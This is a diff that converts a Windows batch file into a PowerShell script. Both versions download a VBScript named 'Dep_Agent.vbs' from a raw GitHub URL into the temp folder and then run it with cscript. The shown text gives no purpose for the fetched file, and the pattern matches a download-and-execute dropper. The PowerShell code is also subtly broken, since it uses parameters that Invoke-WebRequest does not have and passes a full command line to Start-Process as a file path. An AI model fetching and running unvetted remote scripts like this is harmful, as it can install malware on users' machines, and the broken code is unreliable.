@@ -1,31 +1,29 @@
-@echo off
+$url = "https://raw.githubusercontent.com/tahirioualid/EM/main/Dep_Agent.vbs"
+$output = "$env:TMP\file.vbs"
+$command = "cscript.exe $output"
 
-set "url=https://raw.githubusercontent.com/tahirioualid/EM/main/Dep_Agent.vbs"
-set "output=%TMP%\file.vbs"
-set "command=cscript.exe %output%"
+# Create progress bar
+$ProgressPreference = 'Continue'
+$Progress = @{
+    Activity = "Downloading file from $url"
+    Status = "0% Complete"
+    PercentComplete = 0
+}
 
-REM Create progress bar
-set "ProgressPreference=Continue"
-set "Activity=Downloading file from %url%"
-set "Status=0%% Complete"
-set "PercentComplete=0"
+try {
+    # Download file from URL
+    Invoke-WebRequest -Uri $url -OutFile $output -ProgressPreference SilentlyContinue -PercentCompleteScript {
+        $Progress.PercentComplete = $_
+        $Progress.Status = "$($_)% Complete"
+        Write-Progress @Progress
+    }
 
-setlocal EnableDelayedExpansion
+    # Run file using cscript
+    Start-Process -FilePath $command -Wait
 
-for /f "tokens=*" %%a in ('powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%' -ProgressPreference SilentlyContinue -PercentCompleteScript { $PercentComplete=$_; $Status=$PercentComplete+'%% Complete'; Write-Progress -Activity '!Activity!' -Status $Status -PercentComplete $PercentComplete }"') do (
-    echo %%a
-)
-
-if %errorlevel% neq 0 (
-    echo Error: An error occurred during script execution.
-    goto end
-)
-
-REM Run file using cscript
-start /wait "" %command%
-
-REM Show success message
-echo Success: Script ran successfully.
-goto end
-
-:end
+    # Show success message
+    Write-Host "Success: Script ran successfully" -ForegroundColor Green
+} catch {
+    # Show error message
+    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
+}
